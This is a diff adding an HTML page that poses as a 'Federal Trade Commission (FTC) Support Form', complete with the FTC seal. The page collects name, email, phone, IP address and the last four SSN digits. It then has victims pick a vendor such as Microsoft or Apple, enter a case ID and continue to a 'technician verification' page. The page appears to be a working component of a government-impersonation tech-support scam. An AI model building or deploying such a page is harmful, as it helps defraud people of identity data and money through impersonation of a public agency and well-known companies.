@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FTC Support Form</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: white;
+            color: black;
+            text-align: center;
+            padding: 20px;
+            margin: 0;
+        }
+        .container {
+            max-width: 400px;
+            margin: auto;
+            padding: 20px;
+            background: #f3f3f3;
+            border-radius: 5px;
+            box-shadow: 0 0 10px gray;
+        }
+        .logo {
+            width: 120px;
+            margin-bottom: 10px;
+        }
+        label {
+            font-size: 14px;
+            display: block;
+            margin-top: 10px;
+        }
+        input, select {
+            width: 90%;
+            padding: 10px;
+            margin: 5px 0;
+            border: 1px solid gray;
+            border-radius: 5px;
+            background: white;
+            color: black;
+            font-size: 16px;
+            text-align: center;
+        }
+        button {
+            background-color: black;
+            color: white;
+            padding: 10px 20px;
+            font-size: 18px;
+            border: none;
+            cursor: pointer;
+            border-radius: 5px;
+            margin-top: 15px;
+        }
+        button:hover {
+            background-color: gray;
+        }
+        .support-display {
+            display: none;
+            margin-top: 20px;
+            text-align: center;
+        }
+        .support-logo {
+            width: 100px;
+            margin-bottom: 10px;
+        }
+        .case-id-section {
+            display: none;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6e/US-FederalTradeCommission-Seal.svg" alt="FTC Logo" class="logo">
+        <h2>Federal Trade Commission (FTC)</h2>
+
+        <label for="name">Full Name</label>
+        <input type="text" id="name" placeholder="Enter your name" required>
+
+        <label for="email">Email</label>
+        <input type="email" id="email" placeholder="Enter your email" required>
+
+        <label for="phone">Phone</label>
+        <input type="tel" id="phone" placeholder="Enter your phone number" required>
+
+        <label for="ip">IP Address</label>
+        <input type="text" id="ip" placeholder="Enter your IP address" required>
+
+        <label for="ssn">Last 4 Digits of SSN</label>
+        <input type="text" id="ssn" placeholder="Enter last 4 digits" required maxlength="4">
+
+        <label for="support">Select Support Partner</label>
+        <select id="support" onchange="updateSupportInfo()">
+            <option value="">-- Choose Support Partner --</option>
+            <option value="Microsoft">Microsoft</option>
+            <option value="Apple">Apple</option>
+            <option value="Google">Google</option>
+            <option value="Samsung">Samsung</option>
+            <option value="Amazon">Amazon</option>
+            <option value="Sony">Sony</option>
+        </select>
+
+        <div class="support-display" id="supportInfo">
+            <img id="supportLogo" class="support-logo" src="" alt="">
+            <h3 id="supportName"></h3>
+            
+            <div class="case-id-section" id="caseIdSection">
+                <label for="caseId">Enter Your Case ID</label>
+                <input type="text" id="caseId" placeholder="Enter Case ID" required>
+            </div>
+        </div>
+
+        <button onclick="redirectToTechnicianPage()">Submit</button>
+    </div>
+
+    <script>
+        function updateSupportInfo() {
+            let support = document.getElementById("support").value;
+            let supportInfo = document.getElementById("supportInfo");
+            let supportLogo = document.getElementById("supportLogo");
+            let supportName = document.getElementById("supportName");
+            let caseIdSection = document.getElementById("caseIdSection");
+
+            if (support) {
+                supportInfo.style.display = "block";
+                caseIdSection.style.display = "block";
+                supportName.innerText = support;
+
+                let logos = {
+                    "Microsoft": "https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg",
+                    "Apple": "https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg",
+                    "Google": "https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg",
+                    "Samsung": "https://upload.wikimedia.org/wikipedia/commons/thumb/2/24/Samsung_Logo.svg/2560px-Samsung_Logo.svg.png",
+                    "Amazon": "https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg",
+                    "Sony": "https://upload.wikimedia.org/wikipedia/commons/2/25/Sony_logo.svg"
+                };
+
+                supportLogo.src = logos[support];
+            } else {
+                supportInfo.style.display = "none";
+                caseIdSection.style.display = "none";
+            }
+        }
+
+        function redirectToTechnicianPage() {
+            let name = document.getElementById("name").value;
+            let caseId = document.getElementById("caseId").value;
+            let support = document.getElementById("support").value;
+
+            if (!name || !caseId || !support) {
+                alert("Please fill all required fields.");
+                return;
+            }
+
+            // Redirect to technician verification page with parameters
+            window.location.href = `verify-technician.html?name=${encodeURIComponent(name)}&support=${encodeURIComponent(support)}&caseId=${encodeURIComponent(caseId)}`;
+        }
+    </script>
+
+</body>
+</html>
